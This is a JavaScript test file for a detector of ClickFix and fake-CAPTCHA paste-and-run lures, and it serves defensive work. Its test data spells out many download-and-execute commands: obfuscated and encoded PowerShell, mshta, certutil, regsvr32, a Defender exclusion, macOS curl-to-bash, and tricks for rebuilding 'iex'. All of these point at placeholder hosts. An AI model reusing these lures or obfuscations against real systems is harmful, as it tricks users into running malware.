// Analyzer tests. Run: node --test test/
// Lure payloads mirror real ClickFix / fake-CAPTCHA campaigns but point only at
// reserved addresses (RFC 5737 TEST-NET IPs, .example / .test domains), so the
// strings are inert.
"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const { analyze, normalize, notice } = require("../src/analyzer.js");

const b64utf16 = (s) => Buffer.from(s, "utf16le").toString("base64");
const b64 = (s) => Buffer.from(s, "utf8").toString("base64");
const pad = " ".repeat(60);

const FAKE_CAPTCHA_PAGE =
  "Verify you are human. Verification steps: 1. Press Windows Key + R 2. Press CTRL + V 3. Press Enter";
const MAC_LURE_PAGE = "To fix the error, open the Terminal app, paste the command with Cmd + V and press Enter.";

const LURES = {
  mshta_decoy: `mshta https://captcha-check.example/verify.hta # ✅ ''I am not a robot - reCAPTCHA Verification ID: 7537''`,
  mshta_padded: `mshta http://198.51.100.23/c.hta${pad}# Cloudflare Ray ID: 8f2a1c`,
  ps_hidden_iex: `powershell -w hidden -c "iwr http://203.0.113.5/a.ps1 -UseBasicParsing | iex"`,
  ps_w1_bypass_tld: `powershell -w 1 -ep bypass -c "iex (irm 'https://update-check.shop/x')"`,
  ps_encoded: `powershell -nop -w h -enc ${b64utf16("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/s')")}`,
  ps_caret_obfuscated: `p^o^w^e^r^s^h^e^l^l -W^i^n^d^o^w^S^t^y^l^e H^i^d^d^e^n -c "i`+"`"+`e`+"`"+`x(i`+"`"+`r`+"`"+`m https://cdn.test/p)"`,
  ps_concat: `powershell -c "&('i'+'ex')(irm 'https://abc.trycloudflare.com/p')"`,
  cmd_temp_drop: `cmd /c curl -s -o %TEMP%\\svc.exe http://203.0.113.9/svc.exe & start %TEMP%\\svc.exe`,
  conhost_headless: `conhost.exe --headless powershell -c "irm https://files.example.xyz/s | iex"`,
  finger_pipe: `cmd /c finger verify@198.51.100.4 | cmd`,
  msiexec_remote: `msiexec /i https://198.51.100.12/update.msi /qn # I am not a robot - Verification ID 1902`,
  certutil: `certutil -urlcache -split -f http://203.0.113.20/a.exe %TEMP%\\a.exe && %TEMP%\\a.exe`,
  regsvr32: `regsvr32 /s /n /u /i:http://203.0.113.21/file.sct scrobj.dll`,
  defender_exclusion: `powershell -w hidden -c "Add-MpPreference -ExclusionPath $env:APPDATA; iwr https://x.example.top/a -OutFile $env:APPDATA\\a.exe; start-process $env:APPDATA\\a.exe"`,
  zero_width: `pow​ershell -w hid​den -c "iwr http://203.0.113.5/x|iex"`,
  mac_base64: `echo "${b64("curl -s http://203.0.113.30/install.sh | bash")}" | base64 -d | bash`,
  mac_osascript: `osascript -e 'do shell script "curl -s https://updates.example.cfd/a -o /tmp/a; chmod +x /tmp/a; /tmp/a"'`,
  mac_quarantine: `curl -o /tmp/Update.app.zip https://dl.example.live/u.zip && unzip /tmp/Update.app.zip -d /tmp && xattr -c /tmp/Update.app && open /tmp/Update.app`,
  mac_bash_c_ip: `/bin/bash -c "$(curl -fsSL http://198.51.100.40/install.sh)"`,
};

// Lures that are only clearly malicious with the page's lure context.
const CONTEXT_LURES = {
  mac_curl_pipe: [`curl -s https://get.example.com/i.sh | bash`, MAC_LURE_PAGE],
  ps_https_iex: [`irm https://check.example.com/v | iex`, FAKE_CAPTCHA_PAGE],
  unc_webdav: [`cmd /c start \\\\203.0.113.44@SSL\\DavWWWRoot\\v.bat`, FAKE_CAPTCHA_PAGE],
};

const BENIGN = {
  npm: "npm install --save express",
  pip: "pip install -r requirements.txt",
  git: "git clone https://github.com/samdem-ai/portfolio.git",
  docker_sh: "curl -fsSL https://get.docker.com | sh",
  homebrew: '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
  rustup: "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
  winget: "winget install --id Git.Git -e --source winget",
  ps_script: "powershell -ExecutionPolicy Bypass -File .\\build.ps1",
  chocolatey:
    "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))",
  scoop: "irm get.scoop.sh | iex",
  prose: "The meeting is moved to Thursday at 3pm, please bring the quarterly numbers.",
  url: "https://example.com/some/article?id=42",
  code: "const total = items.reduce((a, b) => a + b.price, 0);",
  sql: "SELECT id, name FROM users WHERE created_at > NOW() - INTERVAL '7 days';",
  base64_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc",
};

test("every lure payload is blocked, even without page context", () => {
  for (const [name, text] of Object.entries(LURES)) {
    const r = analyze(text, { programmatic: true });
    assert.equal(r.verdict, "block", `${name}: score ${r.score} ${JSON.stringify(r.reasons.map((x) => x.id))}`);
  }
});

test("context-dependent lures are blocked on lure pages and not on neutral pages", () => {
  for (const [name, [text, page]] of Object.entries(CONTEXT_LURES)) {
    assert.equal(analyze(text, { programmatic: true, pageText: page }).verdict, "block", name);
    assert.notEqual(analyze(text, { programmatic: true, pageText: "Install guide" }).verdict, "block", name);
  }
});

test("benign developer commands and text are never blocked", () => {
  for (const [name, text] of Object.entries(BENIGN)) {
    const r = analyze(text, { programmatic: true, pageText: "Installation docs. Copy the command below." });
    assert.notEqual(r.verdict, "block", `${name}: score ${r.score} ${JSON.stringify(r.reasons.map((x) => x.id))}`);
  }
});

test("plain text on a lure page is not blocked: context alone is never enough", () => {
  for (const text of [BENIGN.prose, BENIGN.url, "7537"]) {
    assert.equal(analyze(text, { programmatic: true, pageText: FAKE_CAPTCHA_PAGE }).verdict, "allow");
  }
});

test("encoded PowerShell is decoded for inspection", () => {
  const r = analyze(LURES.ps_encoded, {});
  assert.ok(r.decoded.some((d) => d.includes("DownloadString('http://203.0.113.7/s')")));
  assert.ok(r.reasons.some((x) => x.id === "download_execute"));
});

test("base64 piped to a shell is decoded and the inner command scored", () => {
  const r = analyze(LURES.mac_base64, {});
  assert.ok(r.decoded.some((d) => d.includes("203.0.113.30")));
  assert.ok(r.reasons.some((x) => x.id === "raw_ip_url"));
});

test("caret / backtick / concatenation obfuscation is removed", () => {
  assert.match(normalize("p^o^w^e^r^s^h^e^l^l").deobfuscated, /powershell/);
  assert.match(normalize("i`e`x").deobfuscated, /iex/);
  assert.match(normalize("'pow'+'ershell'").deobfuscated, /'powershell'/);
  const r = analyze(LURES.ps_caret_obfuscated, {});
  assert.ok(r.reasons.some((x) => x.id === "escape_obfuscation"));
});

test("Run-dialog hiding tricks are reported", () => {
  const ids = analyze(LURES.mshta_padded, {}).reasons.map((x) => x.id);
  assert.ok(ids.includes("whitespace_padding"));
  assert.ok(ids.includes("decoy_comment"));
});

test("warn tier: known-good installer style on a docs page", () => {
  assert.equal(analyze(BENIGN.chocolatey, { programmatic: true }).verdict, "warn");
});

test("notice is a harmless comment in every shell", () => {
  const n = notice("evil.example");
  assert.ok(n.startsWith("#"));
  assert.ok(!n.includes("\n"));
  assert.equal(analyze(n, { programmatic: true, pageText: FAKE_CAPTCHA_PAGE }).verdict, "allow");
});

test("huge input is bounded", () => {
  const t0 = Date.now();
  analyze("a ".repeat(500000) + "powershell", { pageText: "x".repeat(500000) });
  analyze("curl " + "a".repeat(100000), {});
  assert.ok(Date.now() - t0 < 1000);
});

test("intent mismatch: hidden copy behind a 'Verify' button escalates an unknown-looking command", () => {
  // Script from a UNC share: suspicious, but not blockable on content alone.
  const text = "powershell -File \\\\203.0.113.8\\share\\v.ps1";
  assert.notEqual(analyze(text, { programmatic: true }).verdict, "block");
  const r = analyze(text, { programmatic: true, visibleOnPage: false, trigger: "Verify" });
  assert.equal(r.verdict, "block", JSON.stringify(r.reasons.map((x) => x.id)));
  assert.ok(r.deceptive);
});

test("intent match: visible command with a Copy button is trusted more", () => {
  const r = analyze("curl -fsSL https://get.docker.com | sh", { programmatic: true, visibleOnPage: true, trigger: "Copy" });
  assert.equal(r.verdict, "allow");
  assert.ok(r.reasons.some((x) => x.id === "honest_copy"));
  assert.equal(r.deceptive, false);
});

test("deceptive flag arms the guard even when the score is below block", () => {
  const r = analyze("powershell -ExecutionPolicy Bypass -File .\\setup.ps1", { programmatic: true, visibleOnPage: true, trigger: "Continue" });
  assert.equal(r.verdict, "warn");
  assert.ok(r.deceptive);
});

test("PowerShell string tricks are rebuilt without executing anything", () => {
  const { rebuildStrings } = require("../src/analyzer.js");
  for (const [src, want] of [
    ["('{1}{0}' -f 'ex','i')", "'iex'"],
    ["&([char]105+[char]101+[char]120)", "&('iex')"],
    ["[char[]](105,101,120)-join''", "'iex'"],
    ["('i','e','x') -join ''", "'iex'"],
    ["'xei'[-1..-3] -join ''", "'iex'"],
    ["'iQeQx' -creplace 'Q',''", "'iex'"],
    ["$env:comspec[4,15,25]-join''", "'Iex'"],
  ]) assert.equal(rebuildStrings(src), want, src);
});

test("keyword built from [char] codes is detected as download-and-execute", () => {
  const r = analyze(`powershell -w h -c "&([char]105+[char]101+[char]120)(irm 'https://update.example.com/a')"`, { programmatic: true });
  assert.equal(r.verdict, "block");
  assert.ok(r.reasons.some((x) => x.id === "string_reconstruction"));
  assert.ok(r.reasons.some((x) => x.id === "invoke_expression"));
});

test("generic parser: unlisted downloader that saves then runs a file", () => {
  const r = analyze("aria2c https://203.0.113.5/a.exe -o a.exe && a.exe", { programmatic: true });
  assert.equal(r.verdict, "block", JSON.stringify(r.reasons.map((x) => x.id)));
  assert.ok(r.reasons.some((x) => x.id === "fetch_and_run"));
});

test("generic parser: download piped into an unlisted interpreter", () => {
  const text = "wget -qO- https://get.example.com/x | perl";
  assert.ok(analyze(text, { programmatic: true }).reasons.some((x) => x.id === "fetch_and_run"));
  assert.equal(analyze(text, { programmatic: true, pageText: "Press Win + R then Ctrl + V" }).verdict, "block");
});

test("generic parser: unlisted LOLBin against a remote address is caught with context", () => {
  const text = "odbcconf.exe /a {regsvr https://203.0.113.50/x.dll}";
  const r0 = analyze(text, { programmatic: true });
  assert.ok(r0.reasons.some((x) => x.id === "unknown_program_url"), JSON.stringify(r0.reasons.map((x) => x.id)));
  assert.equal(analyze(text, { programmatic: true, visibleOnPage: false, trigger: "I'm not a robot" }).verdict, "block");
});
